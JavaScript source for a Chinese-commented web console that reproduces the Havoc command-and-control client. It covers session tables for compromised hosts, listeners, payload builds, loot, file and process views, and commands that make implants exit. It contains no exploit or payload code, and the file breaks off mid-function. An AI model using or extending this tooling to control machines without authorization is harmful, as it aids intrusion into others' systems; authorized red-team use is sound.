/* Havoc Web Console — 复刻 Qt 客户端 UI */
"use strict";

/* ================================================================
   状态
   ================================================================ */
const S = {
  user: null,
  conn: { state: "starting", detail: "", teamserver: "", user: "", uptime: 0, last_message_ts: null, reconnects: 0 },
  sessions: new Map(),
  listeners: new Map(),
  serviceListeners: new Map(),   // 服务/插件注册的自定义监听器协议
  events: [],
  eventIds: new Set(),
  chat: [],
  loot: [],
  profile: null,
  files: new Map(),       // demon -> {path, entries, ts}
  filesSeq: new Map(),    // demon -> 最新一次目录请求序号（防止旧响应覆盖新目录）
  procs: new Map(),       // demon -> {entries, ts}
  tasks: new Map(),
  tabs: new Map(),        // id -> {id, kind, title, demon, el, closable}
  tabOrder: [],
  activeTab: null,
  mainView: "table",
  consoleCache: new Map(),
  commandMeta: null,
  selectedSession: null,
  sessionColors: (() => { try { return JSON.parse(localStorage.getItem("havoc.sessionColors") || "{}"); } catch (e) { return {}; } })(),
  selectedListener: null,
  // 控制台历史按 Demon 隔离（对齐客户端 DemonInput 自带的 CommandHistory）。
  // Map<demon, {items: string[], pos: number}>；pos 只在本次页面生命周期内有效。
  consoleHistory: new Map(),
  consoleHistoryOrder: [],
  historySaveTimer: null,
  // 会话图视图（translate + scale），可持久化到 localStorage。
  graphView: null,
  graphViewSaveTimer: null,
  ws: null,
  wsOk: false,
  wsAttempts: 0,
  wsTimer: null,
  eventDockOpen: true,
  stagerBase: localStorage.getItem("havoc.stagerBase") || "",
  stagerLast: 0,
  payloadModal: false,
  activeBuildId: null,
  payloadBuilds: new Map(),
  payloadLogs: [],
  store: null,
  storeSelected: null,
  scripts: [],
  scriptSelected: null,
  pythonCommands: [],
  pyLines: [],
};

const $ = (sel) => document.querySelector(sel);
const $$ = (sel) => Array.from(document.querySelectorAll(sel));

/* ================================================================
   工具
   ================================================================ */
function escapeHtml(text) {
  return String(text == null ? "" : text)
    .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;").replace(/'/g, "&#39;");
}
function stripAnsi(text) { return String(text || "").replace(/\x1b\[[0-9;?]*[ -/]*[@-~]/g, ""); }
function now() { return Date.now() / 1000; }
function fmtTime(ts) {
  if (!ts) return "—";
  const d = new Date(ts * 1000);
  return d.toLocaleTimeString("zh-CN", { hour12: false });
}
function fmtDateTime(ts) {
  if (!ts) return "—";
  const d = new Date(ts * 1000);
  const p = (n) => String(n).padStart(2, "0");
  return `${p(d.getDate())}/${p(d.getMonth() + 1)}/${d.getFullYear()} ${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
}
function shortAge(ts) {
  if (!ts) return "—";
  const diff = Math.max(0, Math.floor(now() - ts));
  if (diff < 60) return `${diff}s`;
  if (diff < 3600) return `${Math.floor(diff / 60)}m ${diff % 60}s`;
  if (diff < 86400) return `${Math.floor(diff / 3600)}h ${Math.floor((diff % 3600) / 60)}m`;
  return `${Math.floor(diff / 86400)}d`;
}
function relative(ts) {
  if (!ts) return "—";
  const diff = now() - ts;
  if (diff < 3) return "刚刚";
  if (diff < 60) return `${Math.floor(diff)} 秒前`;
  if (diff < 3600) return `${Math.floor(diff / 60)} 分钟前`;
  if (diff < 86400) return `${Math.floor(diff / 3600)} 小时前`;
  return `${Math.floor(diff / 86400)} 天前`;
}

/* 控制台历史：每个 Demon 独立，最多 200 条；localStorage 最多保留 50 个会话（LRU）。 */
const CONSOLE_HISTORY_KEY = "havoc.consoleHistory.v1";
const CONSOLE_HISTORY_LIMIT = 200;
const CONSOLE_HISTORY_SESSIONS = 50;

function loadConsoleHistory() {
  S.consoleHistory = new Map();
  S.consoleHistoryOrder = [];
  try {
    const data = JSON.parse(localStorage.getItem(CONSOLE_HISTORY_KEY) || "null");
    if (!data || typeof data !== "object" || !data.entries || typeof data.entries !== "object") return;
    Object.keys(data.entries).forEach((demon) => {
      const raw = data.entries[demon];
      if (!Array.isArray(raw)) return;
      const items = raw.filter((x) => typeof x === "string").slice(-CONSOLE_HISTORY_LIMIT);
      S.consoleHistory.set(demon, { items, pos: items.length });
    });
    const order = Array.isArray(data.order) ? data.order.filter((k) => S.consoleHistory.has(k)) : [];
    S.consoleHistory.forEach((_v, k) => { if (!order.includes(k)) order.push(k); });
    S.consoleHistoryOrder = order.slice(-CONSOLE_HISTORY_SESSIONS);
    while (S.consoleHistoryOrder.length < S.consoleHistory.size) {
      const extra = Array.from(S.consoleHistory.keys()).find((k) => !S.consoleHistoryOrder.includes(k));
      if (!extra) break;
      S.consoleHistoryOrder.push(extra);
    }
  } catch (e) { /* localStorage 不可用时静默降级 */ }
}

function saveConsoleHistory() {
  if (S.historySaveTimer) return;
  S.historySaveTimer = setTimeout(() => {
    S.historySaveTimer = null;
    try {
      while (S.consoleHistoryOrder.length > CONSOLE_HISTORY_SESSIONS) {
        const old = S.consoleHistoryOrder.shift();
        S.consoleHistory.delete(old);
      }
      const entries = {};
      S.consoleHistoryOrder.forEach((demon) => {
        const st = S.consoleHistory.get(demon);
        if (st && st.items.length) entries[demon] = st.items.slice(-CONSOLE_HISTORY_LIMIT);
      });
      localStorage.setItem(CONSOLE_HISTORY_KEY, JSON.stringify({
        v: 1, order: S.consoleHistoryOrder.slice(-CONSOLE_HISTORY_SESSIONS), entries,
      }));
    } catch (e) { /* 配额/隐私模式：静默降级 */ }
  }, 120);
}

function consoleHistoryFor(demon) {
  let st = S.consoleHistory.get(demon);
  if (!st) {
    st = { items: [], pos: 0 };
    S.consoleHistory.set(demon, st);
    S.consoleHistoryOrder.push(demon);
  }
  st.pos = Math.min(st.pos, st.items.length);
  return st;
}

function consoleHistoryPush(demon, command) {
  const st = consoleHistoryFor(demon);
  if (st.items[st.items.length - 1] !== command) st.items.push(command);
  if (st.items.length > CONSOLE_HISTORY_LIMIT) st.items.splice(0, st.items.length - CONSOLE_HISTORY_LIMIT);
  st.pos = st.items.length;
  // LRU：最近使用的会话移到队尾
  const idx = S.consoleHistoryOrder.indexOf(demon);
  if (idx >= 0) S.consoleHistoryOrder.splice(idx, 1);
  S.consoleHistoryOrder.push(demon);
  saveConsoleHistory();
}

function consoleHistoryResetPos(demon) {
  const st = consoleHistoryFor(demon);
  st.pos = st.items.length;
}

function consoleHistoryStep(demon, direction, input) {
  const st = consoleHistoryFor(demon);
  if (!st.items.length) return false;
  if (direction < 0) {
    if (st.pos <= 0) return false;
    st.pos -= 1;
  } else {
    if (st.pos >= st.items.length - 1) {
      if (st.pos >= st.items.length) return false;
      st.pos = st.items.length;
      input.value = "";
      return true;
    }
    st.pos += 1;
  }
  input.value = st.items[st.pos] || "";
  return true;
}
function toast(text, kind = "info", timeout = 4000) {
  const el = document.createElement("div");
  el.className = `toast ${kind}`;
  el.textContent = text;
  $("#toasts").appendChild(el);
  setTimeout(() => el.remove(), timeout);
}
function copyText(text) {
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(text).then(() => toast("已复制", "good", 1800)).catch(() => fallbackCopy(text));
  } else fallbackCopy(text);
}
function fallbackCopy(text) {
  const ta = document.createElement("textarea");
  ta.value = text; document.body.appendChild(ta); ta.select();
  try { document.execCommand("copy"); toast("已复制", "good", 1800); } catch (e) { /* ignore */ }
  ta.remove();
}

async function api(path, options = {}) {
  const opts = Object.assign({ credentials: "same-origin", headers: {} }, options);
  if (opts.body && typeof opts.body !== "string") {
    opts.body = JSON.stringify(opts.body);
    opts.headers["Content-Type"] = "application/json";
  }
  const res = await fetch(path, opts);
  let data = null;
  try { data = await res.json(); } catch (e) { data = null; }
  if (!res.ok) {
    const err = new Error((data && (data.message || data.error)) || `HTTP ${res.status}`);
    err.status = res.status;
    throw err;
  }
  return data;
}

/* ================================================================
   登录 / 启动
   ================================================================ */
function showLogin(message) {
  $("#app-view").classList.add("hidden");
  $("#login-view").classList.remove("hidden");
  const box = $("#login-error");
  if (message) { box.textContent = message; box.classList.remove("hidden"); }
  else box.classList.add("hidden");
  setTimeout(() => $("#login-user").focus(), 50);
}

async function doLogin(ev) {
  ev.preventDefault();
  const username = $("#login-user").value.trim();
  const password = $("#login-pass").value;
  const btn = $("#login-btn");
  btn.disabled = true; btn.textContent = "连接中…";
  try {
    await api("/api/login", { method: "POST", body: { username, password } });
    S.user = username;
    await bootApp();
  } catch (err) {
    showLogin(err.message || "登录失败");
  } finally {
    btn.disabled = false; btn.textContent = "连接";
  }
}

async function doLogout() {
  try { await api("/api/logout", { method: "POST" }); } catch (e) { /* ignore */ }
  if (S.ws) { try { S.ws.close(); } catch (e) { /* ignore */ } }
  S.ws = null;
  S.tabs.clear(); S.tabOrder = []; S.activeTab = null;
  $("#tabbar").innerHTML = ""; $("#tab-content").innerHTML = "";
  showLogin("已退出登录");
}

async function init() {
  const hostInput = $("#login-host");
  if (hostInput) hostInput.value = location.hostname;
  const portInput = $("#login-port");
  if (portInput) portInput.value = location.port || (location.protocol === "https:" ? "443" : "80");
  const newProfile = $("#login-new-profile");
  if (newProfile) {
    newProfile.addEventListener("click", () => {
      $("#login-name").value = "NEW";
      $("#login-profile").textContent = "NEW";
      $("#login-user").value = "";
      $("#login-pass").value = "";
      $("#login-user").focus();
    });
  }
  $("#login-form").addEventListener("submit", doLogin);
  loadConsoleHistory();
  initTabScroll();
  initTooltips();
  handleInteractions();
  try {
    const me = await api("/api/me");
    S.user = me.user;
    await bootApp();
  } catch (err) {
    showLogin();
  }
}

async function bootApp() {
  $("#login-view").classList.add("hidden");
  $("#app-view").classList.remove("hidden");
  const userName = $("#user-name");
  if (userName) userName.textContent = S.user || "operator";
  try {
    applySnapshot(await api("/api/state"));
  } catch (err) {
    toast(`加载状态失败：${err.message}`, "error");
  }
  connectWs();
  api("/api/store").then((d) => { S.store = d; }).catch(() => {});
  setInterval(tick, 1000);
}

/* ================================================================
   WebSocket
   ================================================================ */
function connectWs() {
  if (S.ws && (S.ws.readyState === WebSocket.OPEN || S.ws.readyState === WebSocket.CONNECTING)) return;
  clearTimeout(S.wsTimer);
  const proto = location.protocol === "https:" ? "wss" : "ws";
  const ws = new WebSocket(`${proto}://${location.host}/ws`);
  S.ws = ws;
  ws.onopen = () => { S.wsOk = true; S.wsAttempts = 0; updateConn(); };
  ws.onmessage = (ev) => {
    let msg; try { msg = JSON.parse(ev.data); } catch (e) { return; }
    handleMessage(msg);
  };
  ws.onclose = async () => {
    S.wsOk = false;
    updateConn();
    if (S.ws !== ws) return;
    S.ws = null;
    S.conn = Object.assign({}, S.conn, { state: "disconnected", detail: "浏览器与网关断开，正在重连…" });
    updateConn();
    const delay = Math.min(5000, 600 * Math.pow(1.6, S.wsAttempts++));
    if (S.wsAttempts >= 3) {
      try { await api("/api/me"); } catch (err) { if (err.status === 401) { showLogin("登录已失效，请重新登录"); return; } }
    }
    S.wsTimer = setTimeout(connectWs, delay);
  };
}

function applySnapshot(snap) {
  S.sessions = new Map((snap.sessions || []).map((s) => [s.id, s]));
  S.listeners = new Map((snap.listeners || []).map((l) => [l.name, l]));
  S.serviceListeners = new Map((snap.service_listeners || []).map((l) => [l.name, l]));
  S.events = (snap.events || []).slice();
  S.eventIds = new Set(S.events.map((e) => e.id));
  S.chat = (snap.chat || []).slice();
  S.loot = (snap.loot || []).slice();
  S.profile = snap.profile || null;
  S.payloadBuilds = new Map(((snap.payloads) || []).map((b) => [b.id, b]));
  const doneBuilds = Array.from(S.payloadBuilds.values()).filter((b) => b.status === "done");
  if (doneBuilds.length) S.lastBuildId = doneBuilds[doneBuilds.length - 1].id;
  S.conn = snap.connection || S.conn;
  renderSessions();
  renderEvents(true);
  renderStatus();
  updateConn();
  if (!S.tabs.size) openTab("chat", { kind: "chat", title: "团队聊天" });
  else {
    S.tabOrder.forEach((id) => {
      const tab = S.tabs.get(id);
      if (!tab) return;
      if (tab.kind === "chat") renderChatPane(tab.el);
      if (tab.kind === "listeners") renderListenersPane(tab.el);
      if (tab.kind === "loot") renderLootPane(tab.el);
      if (tab.kind === "teamserver") renderTeamserverPane(tab.el);
      if (tab.kind === "files") renderFilesPane(tab.el, tab.demon);
      if (tab.kind === "procs") renderProcsPane(tab.el, tab.demon);
      if (tab.kind === "graph") renderGraphPane(tab.el);
      if (tab.kind === "store") renderStorePane(tab.el);
      if (tab.kind === "mcp") renderMcpPane(tab.el);
      if (tab.kind === "scripts") renderScriptsPane(tab.el);
    });
  }
}

function handleMessage(msg) {
  switch (msg.type) {
    case "snapshot":
      applySnapshot(msg);
      break;
    case "connection":
      S.conn = msg.connection || S.conn;
      updateConn(); renderStatus();
      break;
    case "status":
      S.conn = msg.connection || S.conn;
      S.lastStatus = now();
      updateConn(); renderStatus();
      break;
    case "session":
      if (msg.action === "remove") {
        S.sessions.delete(msg.id);
        renderSessions();
        refreshGraph();
        dropSessionTabs(msg.id);
      } else if (msg.session) {
        const isNew = !S.sessions.has(msg.session.id);
        S.sessions.set(msg.session.id, msg.session);
        if (isNew) { renderSessions(); toast(`会话上线：${msg.session.user}@${msg.session.host}`, "good"); }
        else updateSessionRow(msg.session);
        refreshGraph();
      }
      renderStatus();
      break;
    case "listener":
      if (msg.action === "remove") S.listeners.delete(msg.name);
      else if (msg.listener) S.listeners.set(msg.listener.name, msg.listener);
      renderListenersTable();
      renderStatus();
      break;
    case "service_listener":
      if (msg.listener) {
        S.serviceListeners.set(msg.listener.name, msg.listener);
        if (msg.action === "add") toast(`服务端注册监听器协议：${msg.listener.name}`, "info");
      }
      break;
    case "event":
      if (msg.event && !S.eventIds.has(msg.event.id)) {
        S.eventIds.add(msg.event.id);
        S.events.push(msg.event);
        if (S.events.length > 3000) {
          S.events.splice(0, S.events.length - 3000).forEach((e) => S.eventIds.delete(e.id));
        }
        appendEvent(msg.event);
        if (msg.event.source === "teamserver") {
          const tsTab = S.tabs.get("teamserver");
          if (tsTab) appendTeamserverLine(tsTab.el, msg.event);
        }
      }
      break;
    case "console":
      if (msg.line) {
        cacheConsoleLine(msg.demon, msg.line);
        const tab = S.tabs.get(`console:${msg.demon}`);
        if (tab && S.activeTab === tab.id) appendConsoleLine(tab.el, msg.line);
      }
      break;
    case "mcp": {
      const tab = S.tabs.get("mcp");
      if (tab && msg.status) applyMcpStatus(tab.el, msg.status, true);
      break;
    }
    case "console_clear":
      S.consoleCache.delete(msg.demon);
      { const tab = S.tabs.get(`console:${msg.demon}`); if (tab) tab.el.querySelector(".console-out").innerHTML = ""; }
      break;
    case "task":
      if (msg.task) {
        S.tasks.set(msg.task.task_id, msg.task);
        const tab = S.tabs.get(`console:${msg.task.demon}`);
        if (tab) updateConsoleFoot(tab.el, msg.task.demon);
      }
      break;
    case "chat":
      if (msg.message) {
        S.chat.push(msg.message);
        if (S.chat.length > 600) S.chat.splice(0, S.chat.length - 600);
        const tab = S.tabs.get("chat");
        if (tab) appendChatMessage(tab.el, msg.message);
      }
      break;
    case "fileexplorer":
      // 文件管理器以 REST 响应为准；网关内部校验的 dir 回包不应改变用户当前目录。
      break;
    case "processui":
      S.procs.set(msg.demon, { entries: msg.entries || [], ts: now() });
      { const tab = S.tabs.get(`procs:${msg.demon}`); if (tab) renderProcsTable(tab.el, msg.demon); }
      break;
    case "profile":
      S.profile = msg.profile || null;
      { const tab = S.tabs.get("teamserver"); if (tab) renderTeamserverPane(tab.el); }
      break;
    case "python_commands":
      S.pythonCommands = msg.commands || [];
      S.commandMeta = null;
      toast(`Python 命令已更新：${S.pythonCommands.length} 条`, "info", 2500);
      { const tab = S.tabs.get("scripts"); if (tab) renderScriptsPane(tab.el); }
      break;
    case "payload":
      if (msg.build) {
        S.payloadBuilds.set(msg.build.id, msg.build);
        handlePayloadMessage(msg);
      }
      break;
    case "download":
      if (msg.action === "done") toast(`下载完成：${msg.name}（${msg.size} 字节）`, "good", 5000);
      else if (msg.action === "start") toast(`开始下载：${msg.name}`, "info", 3000);
      break;
    case "loot":
      if (msg.item) {
        S.loot.push(msg.item);
        const tab = S.tabs.get("loot");
        if (tab) renderLootTables(tab.el);
      }
      break;
    default:
      break;
  }
}

/* ================================================================
   顶部状态 / 状态栏
   ================================================================ */
function updateConn() {
  // 客户端菜单栏右侧没有任何状态控件；连接状态通过事件查看器/关于/团队服务器体现。
  renderStatus();
}

function renderStatus() {
  // 客户端没有底部状态栏，菜单栏右侧也没有状态控件。
  const user = $("#user-name");
  if (user && S.conn && S.conn.user) user.textContent = S.conn.user;
}

/* ================================================================
   会话表
   ================================================================ */
function statusMeta(health) {
  if (health === "healthy") return { cls: "healthy", label: "healthy" };
  if (health === "stale") return { cls: "unresponsive", label: "unresponsive" };
  if (health === "dead") return { cls: "dead", label: "dead" };
  return { cls: "unknown", label: "unknown" };
}
function osIconPath(s, opts = {}) {
  // 与客户端 WinVersionIcon()/DeadWhite 对齐（client/src/Util/Base.cpp）。
  // 会话图里 Qt 用 Windows 图标再灰度化，不换成 DeadWhite 骷髅图标。
  if (!opts.graph && (s.health || "") === "dead") return "/static/img/DeadWhite.png";
  const os = String(s.os || "");
  const suffix = s.elevated ? "-icon-high.png" : "-icon.png";
  let base = "unknown";
  if (os.startsWith("Windows 10") || os.startsWith("Windows Server 2019") ||
      os.startsWith("Windows 2019 Server") || os.startsWith("Windows 8") ||
      os.startsWith("Windows Server 2012")) {
    base = "win10-8";
  } else if (os.startsWith("Windows 11")) {
    base = "win11";
  } else if (os.startsWith("Windows 7") || os.startsWith("Windows Vista")) {
    base = "win7-vista";
  } else if (os.startsWith("Windows XP")) {
    base = "winxp";
  } else if (os.startsWith("MacOS")) {
    base = "macos";
  } else if (os.toLowerCase().startsWith("linux")) {
    base = "linux";
  }
  return `/static/img/${opts.graph ? "graph-" : ""}${base}${suffix}`;
}
function heartbeatText(s) {
  // 与 Qt 客户端 SessionTable.cc:163 一致：直接显示 teamserver 的 LastCallIn
  // （dd-mm-yyyy HH:mm:ss，teamserver 本地时区字符串），不要再用 JS 解析一次。
  return s && s.last_call ? String(s.last_call) : "—";
}
function heartbeatTitle(s) {
  if (!s) return "";
  const parts = [];
  if (s.last_seen_ts) parts.push(`${relative(s.last_seen_ts)}（${shortAge(s.last_seen_ts)} 前）`);
  if (s.sleep != null) parts.push(`sleep ${s.sleep}s / jitter ${s.jitter || 0}%`);
  return parts.join(" · ") || "暂无心跳时间";
}
function sessionRowHtml(s) {
  const st = statusMeta(s.health);
  const mark = S.sessionColors && S.sessionColors[s.id];
  const delivery = s.delivery_parent
    ? `<span class="delivery-badge" title="投递自 ${escapeHtml(s.delivery_parent)}${s.delivery && s.delivery.task_id ? " · task " + escapeHtml(s.delivery.task_id) : ""}">↳</span>`
    : "";
  return `
    <td class="id-cell${s.elevated ? " elev" : ""}"${mark ? ` style="color:${mark}"` : ""}><img class="id-icon" src="${osIconPath(s)}" alt="">${escapeHtml(s.id)}${delivery}</td>
    <td>${escapeHtml(s.external_ip || "—")}</td>
    <td>${escapeHtml(s.internal_ip || "—")}</td>
    <td class="user-cell">${escapeHtml(s.user || "—")}</td>
    <td>${escapeHtml(s.host || "—")}</td>
    <td>${escapeHtml(s.os || "—")}</td>
    <td class="proc-cell">${escapeHtml(s.process || "—")}</td>
    <td>${escapeHtml(s.pid || "—")}</td>
    <td data-heartbeat="${escapeHtml(s.id)}" title="${escapeHtml(heartbeatTitle(s))}">${escapeHtml(heartbeatText(s))}</td>
    <td><span class="status-word ${st.cls}">${st.label}</span></td>`;
}
function bindSessionRow(tr, id) {
  tr.addEventListener("mousedown", () => selectSession(id));
  tr.addEventListener("dblclick", () => openConsole(id));
  tr.addEventListener("contextmenu", (ev) => {
    ev.preventDefault();
    selectSession(id);
    showSessionMenu(id, ev.clientX, ev.clientY);
  });
}
function renderSessions() {
  const body = $("#sessions-body");
  const rows = Array.from(S.sessions.values());
  body.innerHTML = rows.map((s) => `<tr data-id="${escapeHtml(s.id)}">${sessionRowHtml(s)}</tr>`).join("");
  $("#sessions-empty").classList.toggle("hidden", rows.length > 0);
  body.querySelectorAll("tr").forEach((tr) => bindSessionRow(tr, tr.getAttribute("data-id")));
}
function updateSessionRow(session) {
  const tr = document.querySelector(`#sessions-body tr[data-id="${CSS.escape(session.id)}"]`);
  if (!tr) { renderSessions(); return; }
  tr.innerHTML = sessionRowHtml(session);
  bindSessionRow(tr, session.id);
}
function selectSession(id) {
  S.selectedSession = id;
  $$("#sessions-body tr").forEach((tr) => tr.classList.toggle("selected", tr.getAttribute("data-id") === id));
}
function showSessionMenu(id, x, y) {
  const s = S.sessions.get(id);
  if (!s) return;
  const dead = s.health === "dead";
  const items = [
    { label: "交互", action: () => openConsole(id) },
    { label: "资源管理器", submenu: [
      { label: "进程列表", action: () => openProcs(id) },
      { label: "文件浏览器", action: () => openFiles(id) },
    ] },
    { sep: true },
    { label: dead ? "标记为存活" : "标记为已死亡", action: () => markSession(id, dead ? "Alive" : "Dead") },
    { label: "颜色标记", submenu: [
      { label: "重置", action: () => setSessionColor(id, "") },
      { label: "红色", action: () => setSessionColor(id, "#ff5555") },
      { label: "蓝色", action: () => setSessionColor(id, "#4c9aff") },
      { label: "黄色", action: () => setSessionColor(id, "#e5c07b") },
      { label: "粉色", action: () => setSessionColor(id, "#ff79c6") },
      { label: "绿色", action: () => setSessionColor(id, "#4ac27a") },
      { label: "紫色", action: () => setSessionColor(id, "#b07cff") },
      { label: "橙色", action: () => setSessionColor(id, "#e0a340") },
    ] },
    { label: "投递链", submenu: [
      { label: "设置投递父会话…", action: () => chooseDeliveryParent(id) },
      ...(s.delivery_parent
        ? [{ label: `清除（当前 ${s.delivery_parent}）`, action: () => clearDeliveryParent(id) }]
        : []),
    ] },
    { sep: true },
    { label: "导出会话", action: () => exportSession(id) },
    { label: "复制会话 ID", action: () => copyText(id) },
  ];
  if (s.magic === "deadbeef") {
    items.push({ sep: true });
    items.push({ label: "退出会话", submenu: [
      { label: "线程", action: () => exitSession(id, "thread") },
      { label: "进程", action: () => exitSession(id, "process") },
    ] });
  }
  items.push({ label: "移除会话", action: () => removeSession(id) });
  showContextMenu(x, y, items);
}

function chooseDeliveryParent(id) {
  const s = S.sessions.get(id);
  if (!s) return;
  const others = Array.from(S.sessions.values())
    .filter((x) => x.id !== id)
    .sort((a, b) => String(a.id).localeCompare(String(b.id)));
  if (!others.length) {
    toast("没有其它会话可作为父会话", "warn");
    return;
  }
  const options = others.map((x) =>
    `<option value="${escapeHtml(x.id)}"${x.id === s.delivery_parent ? " selected" : ""}>` +
    `${escapeHtml(x.id)} · ${escapeHtml(x.user || "?")}@${escapeHtml(x.host || "?")} · ${escapeHtml(x.external_ip || "?")}` +
    `</option>`).join("");
  const modal = openModal("设置投递父会话", `
    <div class="form-grid">
      <label>子会话</label><div class="mono">${escapeHtml(id)} · ${escapeHtml(s.user || "?")}@${escapeHtml(s.host || "?")}</div>
      <label>父会话</label><select id="delivery-parent-select" class="input">${options}</select>
    </div>
    <p class="modal-note">只影响 Web 拓扑的“投递链”虚线，不修改 teamserver/Qt 的 PivotParent；自动识别失败时可在这里手动修正。</p>
  `, [
    { label: "取消", action: closeModal },
    { label: "保存", primary: true, action: async () => {
        const select = modal.querySelector("#delivery-parent-select");
        const parent = select ? select.value : "";
        try {
          const res = await api(`/api/sessions/${encodeURIComponent(id)}/delivery-parent`,
            { method: "POST", body: { parent } });
          const cur = S.sessions.get(id);
          if (cur) {
            cur.delivery_parent = res.delivery_parent || "";
            cur.delivery = res.delivery || null;
            updateSessionRow(cur);
            refreshGraph();
          }
          closeModal();
          toast(`投递链：${parent} → ${id}`, "good");
        } catch (err) {
          toast(err.message || "设置投递父会话失败", "error");
        }
      } },
  ]);
  return modal;
}

async function clearDeliveryParent(id) {
  try {
    await api(`/api/sessions/${encodeURIComponent(id)}/delivery-parent`,
      { method: "POST", body: { parent: "" } });
    const cur = S.sessions.get(id);
    if (cur) {
      cur.delivery_parent = "";
      cur.delivery = null;
      updateSessionRow(cur);
      refreshGraph();
    }
    toast(`已清除 ${id} 的投递父会话`, "warn");
  } catch (err) {
    toast(err.message || "清除投递父会话失败", "error");
  }
}

function dropSessionTabs(id) {
  ["console", "files", "procs"].forEach((kind) => closeTab(`${kind}:${id}`));
  if (S.selectedSession === id) S.selectedSession = null;
}

async function exitSession(id, method) {
  const s = S.sessions.get(id);
  if (!s) return;
  const ok = await confirmDialog(
    "退出会话",
    `确定向 ${id}（${s.user}@${s.host}）下发 exit ${method}？\n` +
    "该操作会让目标上的 Demon 清理并退出，当前会话将随之下线。");
  if (!ok) return;
  try {
    await api(`/api/sessions/${encodeURIComponent(id)}/exit`,
      { method: "POST", body: { method } });
    toast(`已下发 exit ${method}：${id}`, "warn", 5000);
  } catch (err) {
    toast(err.message || "退出会话失败", "error");
  }
}

async function removeSession(id) {
  const s = S.sessions.get(id);
  if (!s) return;
  const ok = await confirmDialog(
    "移除会话",
    `从 Web 控制台移除 ${id}？\n` +
    "仅移除本地表格/拓扑/标签，不会让 teamserver 断开该会话；网关重连后会重新显示。");
  if (!ok) return;
  try {
    await api(`/api/sessions/${encodeURIComponent(id)}/remove`, { method: "POST" });
    S.sessions.delete(id);
    renderSessions();
    refreshGraph();
    dropSessionTabs(id);
    renderStatus();
    toast(`已移除会话 ${id}`, "warn");
  } catch (err) {
    toast(err.message || "移除会话失败", "error");
  }
}

function setSessionColor(id, color) {
  if (color) S.sessionColors[id] = color;
  else delete S.sessionColors[id];
  try { localStorage.setItem("havoc.sessionColors", JSON.stringify(S.sessionColors)); } catch (e) { /* ignore */ }
  renderSessions();
}

function exportSession(id) {
  const s = S.sessions.get(id);
  if (!s) return;
  const blob = new Blob([JSON.stringify(s, null, 2)], { type: "application/json" });
  const a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = `session-${id}.json`;
  document.body.appendChild(a);
  a.click();
  a.remove();
  setTimeout(() => URL.revokeObjectURL(a.href), 1500);
  toast(`已导出会话 ${id}`, "good");
}
async function markSession(id, marked) {
  try {
    await api(`/api/sessions/${encodeURIComponent(id)}/mark`, { method: "POST", body: { marked } });
    toast(`已请求标记 ${id} → ${marked}`, "warn");
  } catch (err) { toast(err.message, "error"); }
}

/* ================================================================
   Tab 管理
   ================================================================ */
function openTab(id, opts = {}) {
  const kind0 = opts.kind || id.split(":")[0];
  if (kind0 === "graph") { showMainView("graph"); return null; }
  if (S.tabs.has(id)) { activateTab(id); return S.tabs.get(id); }
  const tab = {
    id,
    kind: opts.kind || id.split(":")[0],
    title: opts.title || "标签",
    demon: opts.demon || (id.includes(":") ? id.split(":")[1] : null),
    closable: opts.closable !== false,
    el: document.createElement("div"),
  };
  tab.el.className = "tab-pane";
  tab.el.dataset.tab = id;
  $("#tab-content").appendChild(tab.el);
  S.tabs.set(id, tab);
  S.tabOrder.push(id);

  switch (tab.kind) {
    case "chat": renderChatPane(tab.el); break;
    case "console": renderConsolePane(tab.el, tab.demon); break;
    case "files": renderFilesPane(tab.el, tab.demon); break;
    case "procs": renderProcsPane(tab.el, tab.demon); break;
    case "listeners": renderListenersPane(tab.el); break;
    case "loot": renderLootPane(tab.el); break;
    case "teamserver": renderTeamserverPane(tab.el); break;
    case "graph": renderGraphPane(tab.el); break;
    case "store": renderStorePane(tab.el); break;
    case "mcp": renderMcpPane(tab.el); break;
    case "scripts": renderScriptsPane(tab.el); break;
    case "pyconsole": renderPyConsolePane(tab.el); break;
    default: break;
  }
  renderTabbar();
  activateTab(id);
  return tab;
}

function activateTab(id) {
  const tab = S.tabs.get(id);
  if (!tab) return;
  S.activeTab = id;
  S.tabs.forEach((t) => t.el.classList.toggle("active", t.id === id));
  renderTabbar();
  if (tab.kind === "listeners") refreshStager();
  if (tab.kind === "mcp") refreshMcpPane(tab.el);
}

function closeTab(id) {
  const tab = S.tabs.get(id);
  if (!tab) return;
  tab.el.remove();
  S.tabs.delete(id);
  S.tabOrder = S.tabOrder.filter((t) => t !== id);
  if (S.activeTab === id) {
    S.activeTab = null;
    const next = S.tabOrder[S.tabOrder.length - 1];
    if (next) activateTab(next);
  }
  renderTabbar();
}

function renderTabbar() {
  const bar = $("#tabbar");
  const prevScroll = bar.scrollLeft;
  bar.innerHTML = "";
  S.tabOrder.forEach((id) => {
    const tab = S.tabs.get(id);
    if (!tab) return;
    const el = document.createElement("div");
    el.className = "tab" + (id === S.activeTab ? " active" : "");
    el.dataset.tab = id;
    const label = document.createElement("span");
    label.className = "label";
    label.textContent = tab.title;
    el.title = tab.title;
    el.appendChild(label);
    if (tab.closable) {
      const x = document.createElement("span");
      x.className = "x"; x.textContent = "×";
      x.addEventListener("click", (ev) => { ev.stopPropagation(); closeTab(id); });
      el.appendChild(x);
    }
    el.addEventListener("click", () => activateTab(id));
    bar.appendChild(el);
  });
  bar.scrollLeft = prevScroll;
  updateTabScroll();
  const active = bar.querySelector(".tab.active");
  if (active) {
    const b = bar.getBoundingClientRect();
    const r = active.getBoundingClientRect();
    if (r.left < b.left) bar.scrollLeft -= (b.left - r.left + 4);
    else if (r.right > b.right) bar.scrollLeft += (r.right - b.right + 4);
  }
}

function updateTabScroll() {
  const bar = $("#tabbar");
  if (!bar) return;
  const overflow = bar.scrollWidth > bar.clientWidth + 2;
  $("#tab-scroll-left").classList.toggle("hidden", !overflow);
  $("#tab-scroll-right").classList.toggle("hidden", !overflow);
}

function initTabScroll() {
  const bar = $("#tabbar");
  $("#tab-scroll-left").addEventListener("click", () => bar.scrollBy({ left: -240, behavior: "smooth" }));
  $("#tab-scroll-right").addEventListener("click", () => bar.scrollBy({ left: 240, behavior: "smooth" }));
  window.addEventListener("resize", updateTabScroll);
}

function sessionTabTitle(s, suffix) {
  const base = `[${s.id}] ${s.user || "?"}/${s.host || "?"}`;
  return suffix ? `${base} ${suffix}` : base;
}
function openConsole(id) {
  const s = S.sessions.get(id);
  if (!s) return;
